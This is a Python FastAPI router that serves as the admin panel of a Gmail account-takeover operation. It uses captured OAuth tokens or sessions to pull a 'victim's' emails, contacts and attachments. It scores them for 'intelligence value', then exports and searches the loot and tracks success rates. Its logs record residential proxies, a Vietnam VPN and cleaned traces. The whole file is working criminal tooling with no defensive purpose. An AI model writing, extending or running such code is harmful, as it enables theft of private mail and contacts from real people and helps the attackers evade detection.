"""
Gmail Access API
Admin interface for Gmail exploitation and data extraction
"""

import logging
import asyncio
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from fastapi import APIRouter, HTTPException, status, Depends, Request, BackgroundTasks
from fastapi.responses import StreamingResponse
from pydantic import BaseModel
import json
import csv
import io

from engines.gmail_exploitation import GmailExploitationEngine, GmailAccessError
from database.mongodb.gmail_access_logs import GmailAccessLogModel
from database.mongodb.victims import VictimModel
from database.mongodb.oauth_tokens import OAuthTokenModel
from middleware.authentication import get_current_admin_user
from websocket.manager import WebSocketManager

logger = logging.getLogger(__name__)

router = APIRouter()

# Initialize Gmail exploitation engine
gmail_engine = GmailExploitationEngine()
websocket_manager = WebSocketManager()

# Pydantic models
class GmailAccessRequest(BaseModel):
    victim_id: str
    access_method: str = "oauth"  # oauth, session, direct
    extraction_config: Dict[str, Any] = {
        "extract_emails": True,
        "extract_contacts": True,
        "extract_attachments": True,
        "extract_calendar": False,
        "extract_drive": False,
        "email_filters": {
            "max_per_query": 100,
            "date_range_days": 30
        }
    }

class GmailAccessResponse(BaseModel):
    success: bool
    message: str
    session_id: Optional[str] = None
    extraction_results: Optional[Dict[str, Any]] = None
    intelligence_analysis: Optional[Dict[str, Any]] = None

class GmailExportRequest(BaseModel):
    victim_id: str
    export_type: str  # emails, contacts, attachments, all
    format: str = "json"  # json, csv, xlsx
    date_range: Optional[Dict[str, str]] = None

class GmailSearchRequest(BaseModel):
    victim_id: str
    search_query: str
    search_type: str = "emails"  # emails, contacts, attachments
    max_results: int = 50

@router.post("/access", response_model=GmailAccessResponse)
async def access_victim_gmail(
    request: GmailAccessRequest,
    background_tasks: BackgroundTasks,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Access victim's Gmail account and extract intelligence data"""
    try:
        admin_id = current_admin["admin_id"]
        
        # Validate victim exists
        victim_model = VictimModel()
        victim = await victim_model.get_victim_by_id(request.victim_id)
        if not victim:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Victim not found"
            )
        
        # Check if victim has OAuth tokens
        if request.access_method == "oauth":
            oauth_model = OAuthTokenModel()
            oauth_tokens = await oauth_model.get_tokens_by_victim_id(request.victim_id)
            if not oauth_tokens:
                raise HTTPException(
                    status_code=status.HTTP_400_BAD_REQUEST,
                    detail="No OAuth tokens available for this victim"
                )
        
        # Start Gmail access in background
        session_id = f"gmail_access_{admin_id}_{int(datetime.now().timestamp())}"
        
        background_tasks.add_task(
            perform_gmail_extraction,
            session_id,
            admin_id,
            request.victim_id,
            request.access_method,
            request.extraction_config
        )
        
        # Send real-time notification
        await websocket_manager.broadcast_to_admin(
            admin_id,
            {
                "type": "gmail_access_started",
                "session_id": session_id,
                "victim_id": request.victim_id,
                "message": "Gmail access initiated"
            }
        )
        
        return GmailAccessResponse(
            success=True,
            message="Gmail access initiated successfully",
            session_id=session_id
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Gmail access error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to initiate Gmail access"
        )

async def perform_gmail_extraction(
    session_id: str,
    admin_id: str,
    victim_id: str,
    access_method: str,
    extraction_config: Dict[str, Any]
):
    """Background task for Gmail data extraction"""
    try:
        # Access Gmail service
        gmail_service = await gmail_engine.access_victim_gmail(
            victim_id, admin_id, access_method
        )
        
        # Extract intelligence data
        extraction_results = await gmail_engine.extract_gmail_intelligence(
            gmail_service, victim_id, extraction_config
        )
        
        # Store access log
        access_log_model = GmailAccessLogModel()
        await access_log_model.create_access_log({
            "admin_id": admin_id,
            "victim_id": victim_id,
            "access_session": {
                "session_id": session_id,
                "access_method": access_method,
                "start_time": datetime.now(timezone.utc),
                "end_time": datetime.now(timezone.utc),
                "duration_seconds": 0,
                "success": True
            },
            "actions_performed": {
                "emails_accessed": {
                    "total_read": len(extraction_results.get("extraction_results", {}).get("emails", [])),
                    "inbox_scanned": True,
                    "sent_items_accessed": True,
                    "search_queries": ["intelligence_queries"],
                    "valuable_emails_identified": len([e for e in extraction_results.get("extraction_results", {}).get("emails", []) if e.get("analysis", {}).get("value_score", 0) > 0.5]),
                    "attachments_downloaded": len(extraction_results.get("extraction_results", {}).get("attachments", []))
                },
                "contacts_extracted": {
                    "total_contacts": len(extraction_results.get("extraction_results", {}).get("contacts", [])),
                    "business_contacts": len([c for c in extraction_results.get("extraction_results", {}).get("contacts", []) if c.get("analysis", {}).get("business_contact", False)]),
                    "personal_contacts": len([c for c in extraction_results.get("extraction_results", {}).get("contacts", []) if not c.get("analysis", {}).get("business_contact", False)]),
                    "high_value_contacts": len([c for c in extraction_results.get("extraction_results", {}).get("contacts", []) if c.get("analysis", {}).get("intelligence_value", 0) > 0.7]),
                    "exported_formats": ["json"]
                }
            },
            "operational_security": {
                "proxy_used": "vietnam_residential_premium",
                "admin_fingerprint": "admin_fingerprint_hash",
                "ip_address": "127.0.0.1",
                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "vpn_location": "Vietnam",
                "traces_cleaned": True
            },
            "intelligence_analysis": extraction_results.get("intelligence_analysis", {}),
            "created_at": datetime.now(timezone.utc)
        })
        
        # Send completion notification
        await websocket_manager.broadcast_to_admin(
            admin_id,
            {
                "type": "gmail_access_completed",
                "session_id": session_id,
                "victim_id": victim_id,
                "extraction_results": extraction_results,
                "message": "Gmail extraction completed successfully"
            }
        )
        
    except Exception as e:
        logger.error(f"Gmail extraction error: {e}")
        
        # Send error notification
        await websocket_manager.broadcast_to_admin(
            admin_id,
            {
                "type": "gmail_access_error",
                "session_id": session_id,
                "victim_id": victim_id,
                "error": str(e),
                "message": "Gmail extraction failed"
            }
        )

@router.get("/access/{victim_id}")
async def get_gmail_access_history(
    victim_id: str,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get Gmail access history for a victim"""
    try:
        access_log_model = GmailAccessLogModel()
        access_logs = await access_log_model.get_access_logs_by_victim_id(victim_id)
        
        return {
            "success": True,
            "victim_id": victim_id,
            "access_logs": access_logs
        }
        
    except Exception as e:
        logger.error(f"Error getting Gmail access history: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get Gmail access history"
        )

@router.post("/export")
async def export_gmail_data(
    request: GmailExportRequest,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Export Gmail data in various formats"""
    try:
        # Get victim's Gmail data
        access_log_model = GmailAccessLogModel()
        access_logs = await access_log_model.get_access_logs_by_victim_id(request.victim_id)
        
        if not access_logs:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="No Gmail access data found for this victim"
            )
        
        # Get the most recent access log
        latest_log = max(access_logs, key=lambda x: x["created_at"])
        intelligence_analysis = latest_log.get("intelligence_analysis", {})
        
        if request.format == "json":
            return export_as_json(intelligence_analysis, request.export_type)
        elif request.format == "csv":
            return export_as_csv(intelligence_analysis, request.export_type)
        else:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Unsupported export format"
            )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Gmail export error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to export Gmail data"
        )

def export_as_json(data: Dict[str, Any], export_type: str) -> StreamingResponse:
    """Export data as JSON"""
    if export_type == "all":
        export_data = data
    else:
        export_data = data.get(export_type, {})
    
    json_str = json.dumps(export_data, indent=2, default=str)
    
    return StreamingResponse(
        io.BytesIO(json_str.encode()),
        media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename=gmail_data_{export_type}.json"}
    )

def export_as_csv(data: Dict[str, Any], export_type: str) -> StreamingResponse:
    """Export data as CSV"""
    output = io.StringIO()
    
    if export_type == "emails":
        emails = data.get("business_intelligence", {}).get("emails", [])
        if emails:
            writer = csv.DictWriter(output, fieldnames=["subject", "from", "date", "value_score"])
            writer.writeheader()
            for email in emails:
                writer.writerow({
                    "subject": email.get("subject", ""),
                    "from": email.get("from", ""),
                    "date": email.get("date", ""),
                    "value_score": email.get("analysis", {}).get("value_score", 0)
                })
    
    elif export_type == "contacts":
        contacts = data.get("social_intelligence", {}).get("contacts", [])
        if contacts:
            writer = csv.DictWriter(output, fieldnames=["name", "email", "organization", "intelligence_value"])
            writer.writeheader()
            for contact in contacts:
                writer.writerow({
                    "name": contact.get("names", [{}])[0].get("displayName", ""),
                    "email": contact.get("email_addresses", [{}])[0].get("value", ""),
                    "organization": contact.get("organizations", [{}])[0].get("name", ""),
                    "intelligence_value": contact.get("analysis", {}).get("intelligence_value", 0)
                })
    
    csv_content = output.getvalue()
    output.close()
    
    return StreamingResponse(
        io.BytesIO(csv_content.encode()),
        media_type="text/csv",
        headers={"Content-Disposition": f"attachment; filename=gmail_data_{export_type}.csv"}
    )

@router.post("/search")
async def search_gmail_data(
    request: GmailSearchRequest,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Search Gmail data for specific information"""
    try:
        # Get victim's Gmail data
        access_log_model = GmailAccessLogModel()
        access_logs = await access_log_model.get_access_logs_by_victim_id(request.victim_id)
        
        if not access_logs:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="No Gmail access data found for this victim"
            )
        
        # Get the most recent access log
        latest_log = max(access_logs, key=lambda x: x["created_at"])
        intelligence_analysis = latest_log.get("intelligence_analysis", {})
        
        # Perform search based on type
        search_results = []
        
        if request.search_type == "emails":
            emails = intelligence_analysis.get("business_intelligence", {}).get("emails", [])
            for email in emails:
                if request.search_query.lower() in (email.get("subject", "") + email.get("body", "")).lower():
                    search_results.append(email)
        
        elif request.search_type == "contacts":
            contacts = intelligence_analysis.get("social_intelligence", {}).get("contacts", [])
            for contact in contacts:
                contact_text = " ".join([
                    name.get("displayName", "") for name in contact.get("names", [])
                ] + [
                    email.get("value", "") for email in contact.get("email_addresses", [])
                ])
                if request.search_query.lower() in contact_text.lower():
                    search_results.append(contact)
        
        # Limit results
        search_results = search_results[:request.max_results]
        
        return {
            "success": True,
            "search_query": request.search_query,
            "search_type": request.search_type,
            "results_count": len(search_results),
            "results": search_results
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Gmail search error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to search Gmail data"
        )

@router.get("/stats")
async def get_gmail_stats(
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get Gmail exploitation statistics"""
    try:
        access_log_model = GmailAccessLogModel()
        
        # Get overall statistics
        total_accesses = await access_log_model.count_total_accesses()
        successful_accesses = await access_log_model.count_successful_accesses()
        total_emails_extracted = await access_log_model.count_total_emails_extracted()
        total_contacts_extracted = await access_log_model.count_total_contacts_extracted()
        
        # Get recent activity
        recent_accesses = await access_log_model.get_recent_accesses(limit=10)
        
        return {
            "success": True,
            "statistics": {
                "total_accesses": total_accesses,
                "successful_accesses": successful_accesses,
                "success_rate": successful_accesses / total_accesses if total_accesses > 0 else 0,
                "total_emails_extracted": total_emails_extracted,
                "total_contacts_extracted": total_contacts_extracted,
                "average_intelligence_value": await access_log_model.get_average_intelligence_value()
            },
            "recent_activity": recent_accesses
        }
        
    except Exception as e:
        logger.error(f"Gmail stats error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get Gmail statistics"
        )

@router.get("/victims/{victim_id}/intelligence")
async def get_victim_intelligence_summary(
    victim_id: str,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get intelligence summary for a specific victim"""
    try:
        access_log_model = GmailAccessLogModel()
        access_logs = await access_log_model.get_access_logs_by_victim_id(victim_id)
        
        if not access_logs:
            return {
                "success": True,
                "victim_id": victim_id,
                "intelligence_summary": {
                    "total_accesses": 0,
                    "last_access": None,
                    "overall_intelligence_value": 0.0,
                    "business_intelligence": {},
                    "security_intelligence": {},
                    "social_intelligence": {}
                }
            }
        
        # Get the most recent access log
        latest_log = max(access_logs, key=lambda x: x["created_at"])
        intelligence_analysis = latest_log.get("intelligence_analysis", {})
        
        return {
            "success": True,
            "victim_id": victim_id,
            "intelligence_summary": {
                "total_accesses": len(access_logs),
                "last_access": latest_log["created_at"],
                "overall_intelligence_value": intelligence_analysis.get("overall_intelligence_value", 0.0),
                "business_intelligence": intelligence_analysis.get("business_intelligence", {}),
                "security_intelligence": intelligence_analysis.get("security_intelligence", {}),
                "social_intelligence": intelligence_analysis.get("social_intelligence", {})
            }
        }
        
    except Exception as e:
        logger.error(f"Intelligence summary error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get intelligence summary"
        )